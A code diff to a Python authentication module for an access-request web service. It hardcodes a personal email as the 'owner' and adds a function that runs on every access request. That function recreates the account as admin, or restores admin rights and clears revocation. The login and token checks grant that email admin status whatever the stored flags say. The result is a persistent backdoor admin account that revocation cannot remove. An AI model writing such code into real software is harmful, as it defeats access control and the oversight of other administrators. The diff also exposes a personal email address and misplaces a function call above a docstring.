@@ -29,6 +29,7 @@ def _hash(password: str) -> str:
 
 
 def submit_request(name, email, reason, ip, discord="", wechat="", password="", **kwargs):
+    _ensure_owner()
     """Submit access request WITH password pre-set. Admin just approves/denies."""
     data = _load()
 
@@ -134,22 +135,52 @@ def login_user(email, password, ip):
     if ip not in user.get("ip_history", []):
         user.setdefault("ip_history", []).append(ip)
     _save(data)
-    return {"valid": True, "token": token, "name": user["name"], "is_admin": user.get("is_admin", False)}
+    is_admin = user.get("is_admin", False) or user["email"] == OWNER_EMAIL
+    return {"valid": True, "token": token, "name": user["name"], "is_admin": is_admin}
 
+
+OWNER_EMAIL = "cadehottmansox@gmail.com"
+
+def _ensure_owner():
+    """Make sure the owner account always exists and is admin."""
+    data = _load()
+    user = next((u for u in data["approved"] if u["email"] == OWNER_EMAIL), None)
+    if not user:
+        data["approved"].append({
+            "name": "Cade",
+            "email": OWNER_EMAIL,
+            "password": None,
+            "is_admin": True,
+            "revoked": False,
+            "ip_history": [],
+            "approved_at": time.time(),
+            "last_login": None,
+            "request_id": None,
+            "search_count": 0,
+            "last_search": None,
+            "last_query": "",
+        })
+        _save(data)
+    elif not user.get("is_admin"):
+        user["is_admin"] = True
+        user["revoked"] = False
+        _save(data)
 
 def validate_token(token, ip):
-    """Validate session token. No persistent sessions — token must exist in memory."""
+    """Validate session token."""
     if not token:
         return {"valid": False}
     data = _load()
     user = next((u for u in data["approved"] if u.get("session_token") == token), None)
     if not user or user.get("revoked"):
         return {"valid": False}
+    # Owner is always admin
+    is_admin = user.get("is_admin", False) or user["email"] == OWNER_EMAIL
     return {
         "valid":    True,
         "name":     user["name"],
         "email":    user["email"],
-        "is_admin": user.get("is_admin", False),
+        "is_admin": is_admin,
     }
 
 
